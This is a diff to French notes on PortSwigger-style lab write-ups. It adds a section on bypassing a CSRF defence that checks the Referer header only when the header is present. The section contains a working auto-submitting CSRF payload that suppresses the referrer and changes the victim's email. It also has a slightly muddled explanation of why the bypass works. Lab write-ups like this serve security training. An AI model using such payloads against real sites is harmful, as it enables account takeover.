@@ -130,7 +130,7 @@ L'attaque CSRF est alors possible en incluant ce token dans la requête malveill
 Le chall indique : "csrf token non lié à l'utilisateur"
 Chaque fois qu'on recharge la page, le token change => supposition : le token est généré par le serveur, il doit avoir un usage unique, et peut-être une date de validité
 
-On copie le formulaire :
+3. On copie le formulaire :
 
 ```html
 <form class="login-form" name="emailForm" action="/my-account/change-email" method="POST">
@@ -141,7 +141,7 @@ On copie le formulaire :
 </form>
 ```
 
-On le colle dans l'exploit, on rajoute bien l'url dans l'action (ex:https://0abf00c40352c27b813d03a0009b00b0.web-security-academy.net/), on change l'email et on rajoute un script pour l'envoyer automatiquement.
+4. On le colle dans l'exploit, on rajoute bien l'url dans l'action (ex:https://0abf00c40352c27b813d03a0009b00b0.web-security-academy.net/), on change l'email et on rajoute un script pour l'envoyer automatiquement.
 
 ```html
 <form class="login-form" name="emailForm" action="https://0abf00c40352c27b813d03a0009b00b0.web-security-academy.net/my-account/change-email" method="POST">
@@ -167,6 +167,39 @@ Le token CSRF n'est pas lié à la session utilisateur, il peut être réutilis�
 <br />
 <hr style="height:0; border:1px white solid;" />
 <br />
+
+## CSRF where Referer validation depends on header being present
+
+[https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)
+
+### Étapes
+
+1. Se connecter
+2. Comme pour les autres challs CSRF, on copie le formulaire de changement d'email, en rajoutant un meta referer never.
+
+```html
+<meta name="referrer" content="never">
+
+<form class="login-form" name="loginForm" action="https://0a650008049246378115432a00840003.web-security-academy.net/my-account/change-email" method="POST">
+    <label>Email</label>
+    <input required="" type="email" name="email" value="someEmail2@email.email">
+    <button class="button" type="submit"> Update email </button>
+</form>
+<script>
+  document.loginForm.submit();
+</script>
+```
+
+### Explication
+
+Le serveur valide la requête en se basant sur la présence de l'en-tête Referer.
+Si l'en-tête est absent, la validation échoue, permettant à un attaquant de contourner la protection CSRF.
+
+### Recommandations
+
+- Ne pas se fier uniquement à la présence de l'en-tête Referer pour valider les requêtes
+
+[https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-depends-on-header-being-present] (https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-depends-on-header-being-present)
 
 ## JWT - Jeton révoqué
 
